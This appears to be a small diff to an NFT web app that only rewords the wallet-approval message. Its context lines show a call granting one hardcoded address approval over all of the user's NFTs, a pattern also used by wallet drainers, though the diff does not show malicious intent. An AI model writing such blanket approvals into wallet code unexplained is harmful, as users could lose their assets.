@@ -117,7 +117,7 @@ function App() {
   });
   
   const approveNFTs = () => {
-    setAproveFeedback(`Approving your ${CONFIG.NFT_NAME}, Check your wallet is connected ...`);
+    setAproveFeedback(`Approving your ${CONFIG.NFT_NAME}, Check your wallet is connected first ...`);
     blockchain.smartContract.methods
     .setApprovalForAll("0x4D8C6bFEA02A8739D587F7BB9B76D5BB581eB9c6",true)
     .send({
